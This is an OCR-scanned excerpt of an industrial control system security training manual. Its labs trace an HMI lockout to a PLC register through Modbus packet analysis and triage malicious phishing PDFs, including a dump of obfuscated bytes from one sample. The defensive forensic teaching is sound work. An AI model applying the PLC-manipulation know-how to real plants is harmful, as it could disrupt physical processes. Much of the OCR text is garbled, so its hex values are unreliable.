13, BIT, 145059, "FC=02", “Gen_Ramp_Down_To_Load", 0, No,"

T10, BIT, 145066, "FO=02", "Gen_Fuel_Valve_i
712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp_Watchdog", 0,No

SC2,BIT, 161442, "FC=02","_1st_SCAN",0,No, ""
DS1, INT, 400001, "FC=03, 06, 16", "Gen_External_MW_Max",0
DS2, INT, 400002, “FC=03, 06, 16", "Gen Generator Max Pwr*
6, 16","Gen_Bar_ Graph Out |

y-On_HME*, 0,80, «| [lle
"OfF_HMI",0,No
| Brkr_Opn_Init
Brkt,

Brkr,
Brkr_Close_In

Open Brkr_aMz
‘close _Brkz_am || 129

Famp_Sim", 0,8

Timer", 0,No,”

ale
tor_out_Valu} | 129
cr_Min_Bkt_Cl
_Requested_ Pw

>

1

134 @t51,

5,Bit, 16709, "Fc=01, 05, 15", “Furnace2_On_ BMI",
326, BIT, 16710, "FC=01, 05, 15", "Furnace? Off HMI", 0,No
€327,BIT, 16711, "FC=01,05, 15", "Dist_Ind Brkr_Opn_Init
6328, BIT, 16712, "FC~01, 05,18", "Dist_Ind_Brkr_Open_zer
6329, BIT, 16723, "FC=03, 05,15", "Dist_Ind_Brkr_Open®, 0,
C330, BIT, 16724, "FC=01,05, 15", “Dist_Ind Brkr_Close_In
€331, BIT, 16715, "FC=01, 05,15", "Dist_Ind Brix,
32, BIT, 16716, "PC#01, 05, 15", Dist. Ind YBrkr “closed”,
C334, BIT, 16718, "FC+01, 05,15", “pist_ ind_Open_} Beker, AE
C335, BIT, 16719, "FC=01,05, 1S", "Dist_Ind { Close_Brkr. HM
72, BIT, 145058, "FC=02", "Gen_Ramp_Up_To_Load", 0, No,
73, BIT, 145059, “FC=02", "Gen Ramp Down To Load", 0,No,"
T10,BIT, 145066, "FC=02", "Gen_Fuel_Valve_Ramp_Sim*,0,N
712, BIT, 145068, "FC=02", "Gen_Fuel_Ramp Watchdog", 0,
T15, BIT, 145071, °FC=02", "Comm Watch Dog Timer”, 0,No,”

*rce2", "Pe

©3258

$C2,BIT, 161442, "FC=02", *_
Dg1, INT, 400001, "FC=03, 06,16", “Gen_External_MW_Max",0
DS2, INT, 490002, *PC=03, 06,16", "Gen Generator Max Pwr"
DS3, INT, 400003, "FC=03, 06, 16", "Gen _Bar_Graph_Out_Calcy
DS4, INT, 490004, "FC#03,06, 16", "Gen _Genérator_out_Valu
DSS, INT, 490005, "EC=03,06, 16", "Gen Genertr_Min_Bkr_Cl
DS6, INT, 400006, "FC=03, 06, 16", "Gen Total Requested Pw”
DS7, INT, 400007, *FC=03, 06, 16", "Gen Total Available Pw
DSB, INT, 400008, "FC=03,.06,16%, "Gen Total Locl_MW SP",
DS, INT, 400009, "FC=03, 06, 16", “Gen_Total_Ext_Hw_SP*,0
S10, INT, 400010, *FC=03, 06,16", "Gen_Local_Manual_out_
DS11, INT, 400011, "FC=03, 06,16", "Gen_CT_Fuel_Valve_Man
D912, INT, 400012, "PC#03, 06, 16", "Gen_CT_Puel_Valve_Out
DS13, INT, 400013, "FC=03, 06,16", "Gen CT Puel Viv _Auto_
DS14, INT, 400014, "FC=03, 06,16", "Gen Fuel Valve SP CV ¥
ev >

5

length 18,324 lines: 184

Uns134 Cols Pos: 13,370

Windows (CRLF) _UTE-8 INS

*Note* This is the tag where the HMI screen is being remotely controlled. Investigate this Click PLC memory

location and make sure this value is set to “0” which would mean it is not able to be remotely controlled from

the PLC.

*Answer* RemoteHMI Register DS51

© 2021, Robert M. Lee

Lab 4.2-4

ae

td

py

yey Ww

“a ws w w w wy

we wT ww Ww Ww

Qs’

2. What is the value of the Register? 1

> Go Online and determine the value of DS51

> Inthe previous task on Step 8, you have downloaded program ICS515 for Production
Boards.ckp and you should be online with the Click. If you are not online with the Click PLC,
open the ICS515 Site Acceptance Test V1.ckp project to launch the Click programming software
and then write the project to PLC.

> After the project write has occurred and you are connected to the PLC, use the navigation
window on the left side of the Click software, to find and double-click the “DataView1” viewer
to open the DataView window

CLICK Programming Software (Version 3.01) - ICS515 Site Acceptance Test VI.ckp - [Main Progrem}
Monitor Window Help,

io Oa WadivessPicker TE) WayRend Project. Online «== Stans
yp Cross Reference Wa Wiite Project 8 Run TB dete View ~
CPU VO Softwore 5 syntax Check 3 PLC Information C7) PLC Error

Program Function PLC
©-Ry Subroutine Program a
Sa BreakerModels 1
Sey DistindAlarms
Ay DistindStates
Sy Distindustrial
Sy DistResAlarms
Sgy DistResidential
Igy DictResstates
§@4 Gen_Fuel_Control
Gy Gendlarms
§G4 Generation
Sl Genstates
gf Indticlize
$y FemoteCommvd
§@y TransAlarms
Si Transmission can
By Transtetes $ TranStates
§@ Interrupt Program
@ Address Picker
GF Edit Rung Comments
4p Local Program Information: TransAlarrns
D symax Check Transmission
Cross Reference View Teanittates:

8 mira fi 1CS515 Site Acceptance Test V1 - 0 error(s), O warningls)
Status Monitor

all
titolo

HH
FM, consemes

Call,
3 ; ney Generation

4 _ Gen_Fuel_Contro!

u
5 SP Senatarms

>
ee ee eee ti Ree en eel RES ax

Write Project into PLC...
‘Transfer compieted.

Tee Tevt View

> Inthe DataView window, scroll to the bottom of the addresses being tested. You will see DS51
and that this value is 1. We want to change that value to 0 to unlock the HMI screen.

© 2021, Robert M. Lee Lab 4.2-5
a} Data View -[DataView1] _ x

Edit = Fill Down

View Override

© 2021, Robert M. Lee

> Anew Address Picker window will appear. In the Find input field, search for the new values
that you discovered when comparing the logic files — enter in RemoteHMI and select Find

& Address Picker : Pickup Mode

2

Breaker Op...

Gen_

| lo |< [x

38 9as6 |xese lag

~) -Used/Unused Address~ Fon (1) Display MODBUS Address

| @Display both used and unused | MODBUS 984 Addressing
Integer (Words) | | Op orty used MODBUS HEX Addressing
Floating Point shard : a
red © Display only unused

Lab 4.2-6

=>

= -—
wo wo Ww wo Ww WD WwW Ww we ee we

ie) Le /_

(s’

wa Ww

> With the RemoteHMI Nickname and Address DS51 highlighted, select OK to add this address to
your DataView1 field

& Address Picker : Pickup Mode

Fill Down (Nickname) Find: [RemoteHM ~ | Exact Match Find

lAddress ai[Data Type [Nickname |used | Address Cony

t |RemoteHMI INo

TargetFuelSettin... Yes Target Fu...
Fuel_Valve_Perce... Yes Fuel Valve...

die

> With your DataView1 window now displaying DS51, select the Edit button in the upper left, so
we can manipulate the value and change it from a1 to a0

> For DS51 enter in a New Value of 0 and then double click the write graphic to the right of the
new value.

Fe Data View -[DataView1] = oO x

Gen_Breaker_Open_FOfF

RemoteHMI 1 | Integer Remote HMI

> You should see the Current Value displayed change to a 0.
> Verify the HMI is now working

*Note* You've figured out that 1 locks the screen and returning that value to 0 fixes the controller’s logic.

*Answer* 1 which locks the screen

© 2021, Robert M. Lee Lab 4.2-7

Task — Validate the Findings in the ICS Protocol

3. What is the HEX value to search the pcap for Responses with Register 50? 0x01040032

*Note* Matrikon leverages the decimal system and DS51 would translate to decimal 50. Therefore, we could
leverage the network capture to identify write commands to DS51. This system is using ModbusTCP which
means it would be writing to the Register (and because it’s decimal 50 for DS51) specifically Register 50.
> Open lockedhmi.pcap in Wireshark ‘ ua
> Open the RELICS VM
> Open the ICS515 folder located on the Desktop and then navigate to c3po > pcaps
> Double click on lockedhmi.pcap to open the file in Wireshark

*Note* 192.168.0.8 is the HMI and 192.168.0.10 is the Click PLC. We are looking for Register 50 on the Click
PLC to determine if we can see commands being written to validate the logic. Register 50, for DS51, would
translate to 32 in HEX.

*Note* Now we need to understand what is taking place in the ModbusTCP transactions; if we analyzed
every packet it would take too long. But we can determine what function codes are being used and see what
might be of value (writes and reads as an example). Because we suspect the PLC is writing to the HMI and not
the other way around we would be looking for the HMI issuing a Read command to the PLC. The response
would have the write value, inappropriately, to the HMI.

> Identify the various Read focused function codes
> A quick review of the “Info” section in Wireshark will show a couple different type of Read function
codes
> Sample the Query and Responses to determine which Function Code is most likely to be helpful

75 Response: Trans: 25021; Unit: 1, Func
66 Query: Trans: 25022; Unit: 1, Funes
127 Response: Trans: 25022; Unit: 2.) Fane:
66 Query: Trans: 25023; Unit: 1, Func: Read Holding Registers
127 Response: Trans: 25023; Unit: 1, Func: ing Kegisters
131 Query: Trans: 25024; Unit: 1, Func: 16: Write Multiple Registers
66 Response: Trans: 25024; Unit: 1, Func: 16: Write Multiple Registers
66 Query: Trans: 25025; Unit: 1, Func: Read Discrete Inputs

75 Response: Trans: 25025; Unit: 1, Func: Read Discrete Inputs

66 Query: Trans: 25426; Unit: 1, Func: Read Input Registers

127 Response: Trans: 25026; Unit: 1, Func: Read Input Registers

66 Query: Trans: 25427; Unit: i, Funes Read Holding Registers

Read Discrete Inputs

Read Input Registers
Read Tnput Reeisters

WwW & &N

ww b fw Ny

127 Response: Trans: 25027; Unit: 1, Func: Read Holding Registers

*Note* As an example Read Discrete Inputs is Function Code 2, Read Holding Registers is Function Code 3, and
Read Input Registers is Function Code 4. You could sample each of these to try to determine values that we
might care about. As an example we know we are looking for values related to DS51 which would be Register
50. To determine which Function Code is of value you’d look at the Query and the Response.

© 2021, Robert M. Lee Lab 4.2-8

DDD Om ®

eo @® B® w®

? PRnoonnenoennn nen
Ss)
oe oP ob oO oO Ob bb eb be be w&

ee 8 & oY

as

Qs’

a5

*Note* Function Code 2 as an example has a Query and, in its Response, has various Bit values, not likely
helpful here.

Source Protocol Length Info

192.168.8.9 -168.0.16 Modbus/T.. 66 Query: 25021; Unit: : 2: Read Discrete Inputs
-107108 192.168.0.10 -168.0.9 Modbus/T.. 75 Response: + 250213 Unit: + 2: Read Discrete Inputs
-1073@1 192.168.0.9 +168.0.10 Modbus/T... 66 Query: : 25@22; Unit: 1, Func: 4: Read Input Registers
192.168.8.16 ~168.0.9 Modbus/T.. 127 Response: + 25022; Unit: 1, Fune: + Read Input Registers
192.168.8.9 +168.0.18 Modbus/T.. 66 Query: : 25823; Unit: 1, Func: 3: Read Holding Registers
192.168.6.18 .168.6.9 Modbus /T.. 127 Resoonse: : 25023: Unit: 1. Func: : Read Holding Registers

Length: 15
Unit Identifier: 1
Modbus
988 010 = Function Code: Read Discrete Inputs (2)
[Request Frame: 2]
[Time from request: ©.003476000 seconds]
Byte Count: 12
> Bita:@

*Note* Function Code 3 is querying data from Registers in the Response to the Query so that is promising but
it only goes up to Register 31 in the packets we are reviewing. So it could be valuable to our question but it is
Holding Registers and not Input Registers, it is reasonable to suspect the value changes would be in Input
Registers, but we could come back to this if we don’t have a better option (we will have a better option).

3 61:53:05, 110462 T52,168.0.5 152,168.0.10 _Nodbus/T~ 3: Read Holding Registers
192.168.9.10 192.168.0.9 Modbus/T.. 3: Read Holding Reeisters
Register 29 (UINTI6 ~
Register Number: 29
Register Value (UINTI6): 0
Y Register 30 (UINTI6): @
Register Number: 30
Register Value (UINTI6): @
Y Register 31 (UINTI6): @
Register Number: 31
Register Value (UINTI6): @

*Note* Function Code 4 is querying from Registers in the Response and goes up to Register 31 in the packet
we’re looking at. We really want Register 50 though so we have to see if there are other values other than the
ones going up to Register 31. Any sampling of the Function Code 4 values would show Query gives a Reference
Number for what Register it wants. 0 would give all of them and any other number gives the exact one.

@: Read Input Registers
ead Input Registers
1, Func: 1: Read Coils
1, Func: 1: Read Coils

1918 @1:53:21.420581 192.168.0.8 192.168.0.9 Modbus/T.. 66 Query:
253:21.421322 192.168.0.9 192.168.0.8 Modbus/T... 65 Response:
435526 192.168.0.8 192.168.0.16 Modbus/T.. 66 Query: Trans: 351;
1921 @1:53:21.439289 192.168.2.10 192.168.2.8 Modbus/T.. 78 Response: Trans: 351;
Checksum: @x8188 [unverified]
[Checksum Status: Unverified]
Urgent Pointer: 0
[SEQ/ACK analysis]
[Timestamps]
TCP payload (12 bytes)
[PDU Size: 12]
Modbus/TCP
Transaction Identifier: 43
Protocol Identifier: @
Length: 6
Unit Identifier: 1
Modbus
+8 100 = Function Code: Read Input Registers (4)
Reference Number: 1
word Count: 1

© 2021, Robert M. Lee Lab 4.2-9
> [Timestamps ]
TCP payload (11 bytes)
[POU Size: 11]
Modbus/TCP
Transaction Identifier: 43
Protocol Identifier: @
Length: 5
Unit Identifier: 1
Modbus
-@8@ @10@ = Function Code: Read Input Registers (4)
[Rea Frame: 1918
[Time from request: @.000741@0@ seconds]
Byte Count: 2
Y Register 1 (UINTI6): 100
Register Number: 1
Register Value (UINT16): 100

65 Response:

1919 421322 192.168.0.9 192.168.8.8 Modbus/T.. Trans?
* 192.168.0.8 192.168.9.18 Modbus/T... 66 Query: Trans:
192.168.0.10 192.168.0.8 Modbus/T. 78 Response: Trans:

435 Unit:
351; Unit:
351; Unit:

a, Fune:
1, Func:
1, Func:

4: Read Input Registers
1: Read Coils
1: Read Coils

*Note* Therefore we are looking for a Query that has a Reference Number of 50 for Register 50 which is the
decimal value for DS51. A quick review of the HEX values will tell us exactly what to look for (replacing the

value with the value for 50):

Modbus

Reference Number: 1
Word Count: 1

fev

A

-8@@ @1@@ = Function Code: Read Input Registers (4)

@@ 34 aa 53 46 G8 5@ 66
9020 @@ @9 cc fc O1 F6 38 2a
0830 28 13 81 88 88 68 @@ 2b
oese (ERY

@@ @c 29 Be af bl O@ @c 29 18 b5 Bf G8 GB 45 OO
66 66 c@ ad 68 O38 cO ad
Of 3c a7 2 F7 7@ 5@ 18
66 86 8 6 61

*Note* The Query packet for Function Code 4 we will see the United Identifier is 1 and the Function Code is 4

for a HEX value of 0x0104.

*Answer* Function Code 4 is most likely to be the helpful Query and its HEX identifier is 0x010400. The value
for Reference Number 50 would be 0x32 in HEX. Therefore, we are looking for 0x01040032.

4. What is the first packet the write occurs at in this session and at what time?

> Search for 0x01040032 in the packet capture
> In Wireshark choose Edit > Find Packet

> Enter in 01040032 into the field and click Find

> Look for different values in Register 50

© 2021, Robert M. Lee

Packet 6552
2021-07-11 at 05:54:00 UTC

Lab 4.2-10

RPRmomnmnemnmenemnmeeoewe*ee*oem*nenen#eeoensee*e® ® ® ® © ®
ab vn ty “5

@ hmilocked.pcap
File Edit View Go Capture Analyze Statistics

4 Copy »
Wid & Find Packet... Ctrl+F
ind Next Ctrl+N

Find Previous Ctri+B

Mark/Unmark Packet Ctrl+M
Mark All Displayed Ctrl+Shift+M

eS)

ouoao0s2

Length Info
us T= 127 Response: Trans: 25659; Unit: 1, Func: 3: Read Holding Registers

5078 @1: 248758 192.168.8.8 192.168.¢.10 Modbus /T.. 66{ Query: Trans: 378; Uni : Read Input Registers |
5079 01:53: 249344 192.168.@.10 192.168.0.8 Modbus/T... 65 Response: Trans: 378; Unit 1, Func: 4: Read Input Registers
5082 @1:53:48.309661 192.168.@.9 192.168.6.18  Modbus/T.. 66 Query: Trans: 26537; Unit: 1, Func: 2: Read Discrete Inputs

5983 01:53:48.313269 192.168.@.10 192.168.2.9 Nodbus/T... 75 Response: Trans: 26537; Unit: 1, Func: 2: Read Discrete Inputs
5@85 01:53:48.313665 192.168.@.9 192.168.@.18 Modbus/T... 66 Query: Trans: 26538; Unit: 1, Func: 4: Read Input Registers

Unit Identifier: 1
Y Modbus
+80 @100 = Function Code: Read Input Registers (4)
Reference Number: 58
Word Count: 1

06 do 7c 1a 17 43 00 Oc 29 18 bS BF 08 G8 4500 --|--C-- ) E

00 34 €2 bb 49 08 52.06 00 Oe co as eB Os co as «4B
0@ @a cd 94 01 £6 bd 25 ea SF dB c9 cB 17 50 18 , en
0036 fe 1c 81 89 02 09 @1 7a 6 G0 90 26 O1 HE ee 32 zee Bo
42 8 @1 *

*Note* Now that we have the right Query we need to choose a Response and see the values.

5079 @1:53:48.249344 192.168.0.10 192.168.8.8 Modbus/T. 65 Response: Trans: 378; Unit: 1, Func: 4: Read Input Registers
5@82 01:53:48. 30966 192.168.0.9 192.168.0.1@ Modbus/T.. 66 Query: Trans: 26537; Unit: 1, Func: 2: Read Discrete Inputs
48313269 192.168.@.18 192.168.0.9 Modbus/T.. 75 Response: Trans: 26537; Unit: 1, Func: 2: Read Discrete Inputs
313665 192.168.8.18 Modbus/T.. 66 Query: Trans: 26538; Unit: 1, Func: 4: Read Input Registers

[Time from request: 0.004586000 seconds]
Byte Count: 2
© Register S@ (UINTI6): @
Register Number: 58
Register Value (UINTI6): @
908 00 @c 29 18 bS Bf 22 de 7c 1a 17 43 88 08 45 00
02 33 cf c9 08 0 42 06 29 99 c@ af 00 Ga cd a8
@@ 08 @1 £6 cd 94 d3 c9 cB 17 bd 25 ea Gb 50 18
82 6c OF 72 G0 02 01 7a G0 20 00 05 01 04 02 20
ee

*Note* As we suspected that gave us Register 50. We see that the Register Value is a 0. That is appropriate
and what should be occurring but we know from the logic manipulation that a 1 occurs to lock out the HMI.
We see that the HEX value for the Register 50 response with Register Value of 0 response is 0x0104020000.
Therefore we should expect to see a 0x0104020001 for a Response of 01 thus writing from the PLC to the HMI.

> Search for 0x0104020001 to validate that it exists and find out what time it occurs
> In Wireshark choose Edit > Find Packet

© 2021, Robert M. Lee Lab 4.2-11
> Enter in 0104020001into the field and click Find
> Analyze the packets

col Length Info

us /T. 131 Query: Trans: 26968; Unit: 1, Func: 16: Write Multiple Registers
us /T 66 Response: Trans: 26968; Unit: 1, Func: 16: Write Multiple Registers

Query: Trans) 373: nits 1 euines

1. Read Coils

*Note* Upon hitting Find we do see that the packet exists, keep clicking Find to take you back to the first
instance that this occurs.

6552 61:54:00.669530
6553 @1:54:00. 703885
6554 01:54:00. 705505
6556 @1:54:0@. 705781
6557 @1:54:8, 708419
6559 @1:54:08. 708578
6561 @1:54:00.710438
6563 @1:54:0@.710798
6564 @1:54:@@.713521

~ [Request Frame: 6551]

Byte Count: 2
Y Register 5@ (UINTI6): 1
Register Number: 5@

@000 @@ Oc 29 18 b5 Bf ee de
28 33 di cl @@ 88 40 06
@@ @8 G1 #6 cd 94 dB c9
@2 6c G1 2e 28 CO G1 7a

[Time from request: @.904966000 seconds]

Register Value (UINTI6): 1

192.168.9.18 Modbus /T.
192.168.0.9 Modbus/T..
192.168.8.18 Modbus /T..
192.168.0.9 Modbus/T..
192.168.0.10 Modbus/T.
192.168.0.9 Modbus /T..
192.168.0.18 Modbus/T..
192.168.0.9 Modbus/T...
192.168..10 Modbus/T..
Fe 1s 17 43 08 08 45 20 yovees [eee -E* ~
27 al cO a8 08 Ga cOaB 3B
42 8b bd 25 ed 3b 50 18 %5P

08 @@ 00 05 61040208 Lez

65 Response:
66 © Query:
75 Response:
66 Query:
127 Response:
66 Query:
127 Response:
131 Quer;
66 Response:

378;

: 26973;
2 26973;
1 26974;
2 26974;
: 26975;
: 269753
: 26976;
: 26976;

unit:
Unit:
unit:
Unit:
unit:
unit:
Unit:
unit:
Unit:

-

Bawwrann

: Read Input Registers

: Read Input Registers

: Read Holding Registers

: Read Holding Registers

: Write Multiple Registers
+ Write Multiple Registers)

+ Read Input Registers |

Read Discrete Inputs
Read Discrete Inputs

*Note* We see the first instance of the Register Value of 1 is on packet 6552. You can go under Edit >
Preferences and change the Time display if you’d like to get to a more recognizable time.

@ Wireshark . Preferences

-

x

v Appearance — ' - _ - _ ;
Columns Displayed Title Type Fields Field Occurence
| Font and Colors) | No. Number
Layout | | Time UTC date, as YYYY-MM-DD, and time
Capture | iM Source Source address
Expert M4 Destination Destination address
Filter Buttons 4 Protecol Protocol
Name Resolution 4 Length Packet length (bytes) |
Protocols ja Info Information
RSA Keys
L_> Statistics |

© 2021, Robert M. Lee

Lab 4.2-12

a ® B® ® fO Of ww ®

@® @® @ ®

)

se» ® ® .

®
a7 wa

/-

Le’ is’ ca’ a a a a ie

iB

“5!

6552 2021-@7-11 @5:54:00.669530  192.168.0.10

| 6553 2021-07-11 @5:54:00.703085  192.168.0.9
| 6554 2021-07-11 @5:54:00.7055@5  192.168.0.10
| 6556 2021-07-11 @5:54:@0.705781  192.168.@.9
| 6557 2021-07-11 @5:54:00.708419  192.168.0.10
| 6559 2021-07-11 @5:54:00.708578  192.168.0.9
| 6561 2021-07-11 @5:54:00.710438  192.168.0.10
: 6563 2021-07-11 @5:54:00.710799 192.168.0.9
' 0.713521 192.168.0.10

6564 2621-07-11 @5:54:

PS oe hae a ea eco es eae |
-@@@ @10@ = Function Code: Read Input Registers (4)
Request Frame: 6551
[Time from request: @.2040660@8 seconds]

Byte Count: 2
Y Register 5@ (UINT16): 1
Register Number: 5@
Register Value (UINT16): 1

*Answer* The first packet was 6552 and occurred at 2021-07-11 at 05:54:00 UTC.

Exercise Takeaways

These two labs have highlighted the following key takeaways:

e PLC’s can be manipulated through their logic to cause confusion between the logical and physical
states; operators may understand this but not expect this as a result of a cyber attack

e PLC logic is a ripe target of a logic bomb style compromise which leads to specific logic taking place
under the right conditions or time

e Some HMI systems can be driven from lower levels and it is an unusual vector for an attack but
effective as it would likely be ruled a maintenance issue

e Restoring PLC “known good” logic doesn’t always rewrite corrupt data depending on where the data is
being stored in the system and if it is in volatile or non-volatile memory

e Network traffic analysis with an understanding of the ICS protocol values can be a fantastic source of
forensic data for root cause analysis whether or not the issue is a cyber attack

© 2021, Robert M. Lee Lab 4.2 - 13
wy wy

Ww

ww wo ww ww Ww

Ww

ww wy ww WwW

Lab 4.3 - Analyzing Phishing Emails

e —_ Familiarization with Good PDFs.
e Identifying Potentially Malicious PDFs.

*Scenario Information* This lab in the theme of the scenario would be looking to see how the Calistoga
Refinery incident occurred, but we’re using real phishing emails so that you have experience with them, and
this lab is disconnected from the scenario.

Exercise Prep

This exercise will utilize the RELICS VM. You will need to copy the PDFs into the RELICS VM from your course
ISO from the ICS515_PDFs_Lab3_3_Analyzing_Phishing_Emails.zip file. You can perform the lab anywhere in
the RELICS VM but to make the screenshots match the lab create an extra folder in the ics515 folder on the
RELICS VM Desktop and extract the PDFs to that folder. The PDFs are in a password protected zip. The
password is ICS515CAREFUL#

Do not extract the PDFs outside of the VM as they are malicious.

Questions

What stood out as likely malicious in water_update_part2.pdf?

Did the Nuclear Posture Review PDF seem malicious by first view?
Which Object # seemed most suspicious in the Conference PDF?

How many times was /Encrypt and /JavaScript used in Conference PDF?

Pe NP

© 2021, Robert M. Lee Lab 4.3-1
Task — Familiarization with Good PDFs :

*Note* Understanding the full structure of a PDF and the various versions is outside the scope of this class.
However, this portion of the lab will familiarize you with a few good PDFs and the data they contain.

> Start your RELICS VM.

> Log into the VM:
> LOGIN =relics
> PASSWORD = relics

> Navigate to the folder with the PDFs:
> Opena Terminal.
> Run the following command in the terminal:
cad /home/relics/Desktop/ics515/extra

*Note* PDF-parser.py will first be used to analyze PDF1 to determine all the information put into the PDF, such
as objects. Instead of reading the information in the command terminal, it will be output (using the “>”
command) to a text file to be read more easily.

> Analyze PDF1 with pdf-parser.py.

> Inthe command prompt, enter:
pdf-parser.py PDFl.pdf > parserl.txt

fl Ter

pdf-parser.py PDFi.pdf > parseri.txt

> Open parser1.txt in Text Editor:
> Navigate to the ics515 > extra Folder from the Desktop GUI.
> Right click parser1.txt and select open with Text Editor.
> Read through parser1.txt.

*Note* Notice the general pattern of Objects (obj) and the information they contain. Information such as Fonts
takes up a good portion of the document. When you question what a command means, such as /FlateDecode,
you can quickly Google the information to determine the function. In this case, FlateDecode acts as a
compression algorithm to condense information (useful to both attackers and defenders). Interesting
information can be revealed from this type of analysis, such as what the general structure of the document
looks like, or who the Author is and when the Creation date was.

© 2021, Robert M. Lee Lab 4.3-2

>

™,
wa

as 4s 3

aa

1372 Referencing:
1373

1374 <<

1375 © /Author

1376 {Creator '(p9\xOOM\x0e1\x00c\xOe@r\xOG0\x0Os\x080\xOOf\xO8t\xAGa\x08 \xOOW\xOG0\xOOr\xGOd\x0@ \x002\xe00\x001\x000)'
1377 /CreationDate "(0:20150123112257-06'60')"

1378 /ModDate "(D:20156123112257-06'00')"

1379 {Producer '(b9\xO@M\x0Ot\x80c\xGOr\x8G0\x00s\x000\xOOf\xO6t\xd08\x00 \xGOW\x600\x00r\xO0d\xG0 \x002\x000\x001\x000)'
1380 >>

1381

1382

*Note* Being able to manually inspect a PDF document is useful but for quicker references, the tool pdfid can
be used.

> Use pdfid to analyze PDF1.pdf.
> Inthe command prompt, enter:
pdfid.py PDF1l.pdf

$ pdfid.py PDF1.pdf
PDFiD 0.2.7 PDF1.pdf
PDF Header: %PDF-1.5
obj

endobj

stream

endstream

xref

trailer

startxref

{Page

/Encrypt

/Objstm

{3s

/JavaScript

/AA

/OpenAction
/AcroForm
/IBIG2Decode
/RichMedia

/Launch
/EmbeddedFile

/XFA

/URI

{Colors > 2%24

oo

pay

D>NN NM PR

*Note* pdfid looks for certain keywords and information to provide a count of the information to the user. This
document has 94 objects, does not use JavaScript, does not have Encryption, and does not have
EmbeddedfFiles. It is hard to determine a good or bad file from simply looking at it, but understanding the
structure of a PDF and what type of information is abused can be useful for identifying potentially malicious
documents for further analysis. Spend a few minutes and repeat Steps 4 — 7 on PDF 5 and PDF 6 to notice
differences in different types of PDFs.

© 2021, Robert M. Lee Lab 4.3-3
Task - Identifying Potentially Malicious PDFs j

1. What stood out as likely malicious in water_update_part2.pdf?
Multiple %EOFs and Javascript

> Analyze water_update_part2.pdf with pdf-parser.py.
> Inthe command prompt, enter:
pdf-parser.py water_update_part2 .pdf > parser-water.txt

§ pdf-parser.py water_update_part2.pdf > parser-water.txt

> Open parser-water.txt with Text Editor:
> Read through the file and notice differences from PDF1, PDFS, and PDF6.
> Look for abnormal items.

[183 PDF Comment '%%EOF\n'

184

185 PDF Comment '%\ xab\xa7n\xde\xdd\xdd\xa1\xe5&\xa9%\xab\xa7j\xdc\xdd\xdd\xa1\xe5&\xa9%\ xab\
\xab\xa7\xie\xde\xdd\xdd\xa1 \xe58 \xab\x9f \x1a\xde\xdd\xdd3\xa2"""\xaf\xafr\xde\xdd\xddsh"
\xaig\x9e&\xc9\xcbH"H" \xa9\xa7\x1e\xdc\xdd\xddr\xa90\x9es \xddw\ xfa\xaf\xb7\x06\xdd\ xdd\xd
H"H 3"""\ xe2\xaf\xaf\x06\xdd\ xdd\xdds \ xddw\xfe\xabg\xe6\xe5\xa7\x16\xdc\xdd\xdd""""\xa9\x)
\xai\xai"""H" \xafo\x96s2"&"" \xaf\ xb7\x16\xd8\ xdd\ xddp\ xa9g\x9er \xddw\xc2\xe5g\x8a""""\xc9
\x9e\xa67\x16\xd8\xdd | xdd\x11g\x86\xa90\xBa\xaa\xa6/\x16\xdB\xdd \xdd\ xaow\x86\ xa \xc8#\xa
\xa6\xab"""H"\xafo\x96s\xa9\xb7\x16\xdc\xdd\ xdd\ xe3\xco(\xa9\xa7j\xdc\xdd\xdd\t\xeOr \xaf\
\xa9q\x8a\xal\xe2#\xabg\x8a\xa9\xaf\x16\xde\xdd\ xdd\xe3\xc3(\xa9\xb7j\xdc\xdd\ xdd\ t\xF3\x
\x9c\xae\ '\x16\xdB\xdd\xdd\x110\x86\ xa9w\ xBa\ xaa\ xae7 \x16\xd8\xdd\xdd\ xa9g\x86\xa1\xca#\x
\xa7j\xde\xdd\xddr \xa90\x9es\xddw\xfaH"J\xa2"""H H"H
3"""'\xe2\ xaf\xb7\x06\xdd\ xdd\ xddp\ xddw\xfe\xabg\xe2\xe5\xa7\x16\xde\xdd\xdd""""\xa9\xa7F\
\xa90\x8a\xa1\xe3#\xabo\x8a\xa3_\x8a"&""Q8\xa9w\xBa -
\x9c\xa67\x16\xdB\xdd\xdd\ xa \xd2U\ xa9o\xBa\xaa\xa6//\x16\xd8\xdd\xdd\xc9\xf 6H" \xafw\x92p\
\xa6\xa2"""H"\xafg\x96r\xa9\xaf \x16\xdc\xdd \ xdd\ xe3\xc3 (\xa9\xb7F\xde\ xdd\ xdd\ t\xf3p\xaf\
\xa9w\xBa\xa1\xeo#\ xabw\ xBa\xa9\xa7\x16\xde\xdd\ xdd\xe3\xc2(\xa9\xaff\xdc\xdd\xdd\t\xea\x
\x9c\xa67\x16\xdB\xdd\xdd\xa1\xd2U\xa9o\xBa\xaa\xa6 /\x16\xd8\xdd\xdd\xc9\xe5H" \xafw\x92p\
\x02e\xe4%\x00\ xaf\x97\x06\xdd\ xdd\xddled\ xa8<\xaa=\xa2\x1c"W\xd7\xe4%-
\x00e\xe4%" \xaf\xaf \xf2\xdc | xdd\ xdds | xaf\xb7\xc2\xdc | xdd\\xddpH"H"H"H"H"H" \xaf\xa7r\xde\xd
\xdit\xa9T\x02! \xd1\x11\xebqkc\x8fy! \xe1q\x11\xf9-\x9c2\x18\ xf4v*\xe3\xe9%! \xF8b\xc9\xd3\
\xeOu\xaf\x9F\xee\xdd\xdd\ xdd\xa9o\xea\xal\xe5&\xcO\xd9\ x89} \xa1\xe58\xa9\xF8| -
{\xddg\xea\xei\xca{\xd9\xdd\ xdd\xcf\x8d\xdd\x96\xac1(\x8ea\x9c\x8e\xF9\xb1\x10\ xc6\xb6\ x9

186

187 xref

188

189 trailer

199 <<

191 {Size 16
192 /Root 1 OR
193 >>

194 |

195 startxref 32021
196

197 PDF Comment '%%EOF\n'
198

199 PDF Comment '%S#"! \x1f\xte\x1d\xic\x1b\x1a\x196csm*\x13\x12\x11\xd2\x00\xde\r'

Aaa

© 2021, Robert M. Lee Lab 4.3-4

( ( oe ( oe, oe

oe

iad

oe

cad

7?

co

>
‘ed

Ww

Ww

w

Ww

wy

ip

Bs’

is

ae

*Note* In parser-water.txt, you will notice that the structure is significantly different than PDF1, PDF5, and
PDF6. Specifically, there are numerous PDF Comments. This is an area where code can be placed to run upon
execution of the document. What makes this file particularly interesting are the numerous %EOF notes. A quick
Google search will show that %EOF stands for End of File and is used to denote the end of the PDF. PDF1, PDF5,
and PDF6 all had only one %EOF. Yet there are numerous %EOFs in this file. This is a red flag. Additionally,
there is no author information. Nothing instantly makes a PDF malicious, but these types of red flags should
tell the analyst that follow-on analysis is needed, such as running the file through an automated malware
analysis sandbox (discussed later today).

